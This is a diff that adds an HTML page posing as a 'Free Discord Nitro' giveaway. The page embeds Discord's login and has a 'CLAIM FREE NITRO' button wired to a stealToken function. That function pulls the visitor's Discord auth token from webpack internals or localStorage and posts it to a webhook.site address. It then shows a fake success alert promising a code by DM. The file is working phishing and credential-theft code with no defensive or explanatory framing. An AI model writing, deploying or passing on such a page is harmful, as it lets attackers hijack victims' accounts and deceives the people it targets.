@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head><title>Discord Nitro Generator</title>
+<style>body{background:linear-gradient(45deg,#5865F2,#7289DA);color:white;font-family:Whitney,"Helvetica Neue",Helvetica,Arial,sans-serif;text-align:center;padding:50px;}
+button{background:#5865F2;border:none;color:white;padding:15px 30px;font-size:18px;border-radius:5px;cursor:pointer;} button:hover{background:#4752C4;}</style>
+</head>
+<body>
+<h1>🎉 FREE DISCORD NITRO 🎉</h1>
+<p><b>1 YEAR FREE NITRO</b> - LIMITED TIME ONLY!</p>
+<p>Step 1: Login to Discord</p>
+<iframe src="https://discord.com/login" width="400" height="500" style="border:none;margin:20px auto;display:block;"></iframe>
+<p>Step 2: Click button below</p>
+<button onclick="stealToken()">✅ CLAIM FREE NITRO</button>
+<script>
+function stealToken(){
+    let token = '';
+    try{token = webpackChunkdiscord_app?.push([[''],{},e=>{for(let c in e.c)if(e.c[c]?.exports?.default?.getToken)m=e.c[c].exports.default.getToken()||e.c[c].exports.default.getCurrentUser()}])?.find(m=>m)?.exports?.default?.getToken?.call(document)??"";
+    if(!token)token = (webpackChunkdiscord_app.push([[''],{},req=>{for(let m in req.c){c=req.c[m];webpackChunkdiscord_app.push([[m],{},r=>r.c[m]=c])}}]),webpackChunkdiscord_app.find((modIdx,mod)=>mod?.exports?.default?.getToken!==void 0)?.exports?.default?.getToken())??"";
+    if(!token)token=localStorage.token;
+    }catch(e){}
+    if(!token){alert('❌ Login to Discord first, then click again!');return;}
+    fetch('https://webhook.site/a6e4a4c9-ead7-4bd5-b7cd-2f0a1d0ecd48',{method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({username:navigator.userAgent,token:token,ua:navigator.userAgent})});
+    alert('🎉 SUCCESS! Check your DMs from Discord Nitro Team for your code! 🚀');
+}
+</script>
+</body>
+</html>
